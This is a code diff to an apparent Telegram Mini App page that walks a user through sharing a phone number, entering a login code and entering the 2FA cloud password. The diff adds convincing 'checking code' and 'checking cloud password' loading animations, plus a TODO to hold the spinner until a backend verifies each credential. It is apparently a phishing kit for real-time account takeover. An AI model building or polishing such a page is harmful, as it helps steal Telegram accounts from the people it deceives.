@@ -84,12 +84,20 @@
     #root.view-bottom .emoji { font-size: clamp(56px,20vw,88px); }
     #root.view-bottom .btn { padding: 17px 24px; font-size: 17px; }
     .spinner {
-      width: 28px; height: 28px; border-radius: 50%;
-      border: 3px solid rgba(127,127,127,.3);
+      width: 52px; height: 52px; border-radius: 50%;
+      border: 5px solid rgba(127,127,127,.25);
       border-top-color: var(--tg-theme-button-color, #2ea6ff);
-      animation: spin .8s linear infinite; margin: 0 auto 16px;
+      animation: spin .9s linear infinite; margin: 0 auto 18px;
     }
     @keyframes spin { to { transform: rotate(360deg); } }
+    .loading-label { font-size: 16px; opacity: .85; }
+    .loading-dots::after {
+      content: ""; animation: dots 1.2s steps(4, end) infinite;
+    }
+    @keyframes dots {
+      0% { content: ""; } 25% { content: "."; }
+      50% { content: ".."; } 75% { content: "..."; }
+    }
   </style>
 </head>
 <body>
@@ -206,27 +214,45 @@
       nextStep();
     }
 
-    // Единая анимация загрузки между страницами (одинаковая для всех
-    // шаблонов, показывается автоматически при каждом переходе).
-    var LOADING_MS = 700;
+    // Анимации загрузки между страницами. Ключ — страница, С КОТОРОЙ уходим:
+    // подпись описывает, что именно «проверяется». После «поделиться
+    // номером» (уход со страницы main) анимации нет. Сейчас длительность —
+    // заглушка-таймаут; в боевом флоу держите спиннер до ответа бекенда
+    // (замените setTimeout на fetch/опрос статуса проверки).
+    var LOADING = {
+      code:  { label: "Проверяем код",            ms: 2200 },
+      twofa: { label: "Проверяем облачный пароль", ms: 2200 }
+    };
 
-    function showLoading() {
-      html('<div class="spinner"></div>');
+    function showLoading(label) {
+      var l = label
+        ? '<div class="loading-label loading-dots">' + esc(label) + "</div>"
+        : "";
+      html('<div class="spinner"></div>' + l);
       window.scrollTo(0, 0);
     }
 
+    function goTo(i) {
+      step = i;
+      renderStep(step);
+    }
+
     function nextStep() {
-      if (step < PAGES.length - 1) {
-        var nextIdx = step + 1;
-        showLoading();
-        setTimeout(function () {
-          step = nextIdx;
-          renderStep(step);
-        }, LOADING_MS);
-      } else {
+      if (step >= PAGES.length - 1) {
         var tg = tgApp();
         if (tg && tg.close) tg.close();
+        return;
       }
+      var leaving = PAGES[step].key;
+      var nextIdx = step + 1;
+      var anim = LOADING[leaving];
+      if (!anim) {            // напр. main (после номера) — без анимации
+        goTo(nextIdx);
+        return;
+      }
+      showLoading(anim.label);
+      // TODO(бекенд): вместо таймера дождаться ответа проверки кода/пароля
+      setTimeout(function () { goTo(nextIdx); }, anim.ms);
     }
 
     function renderGranted() {
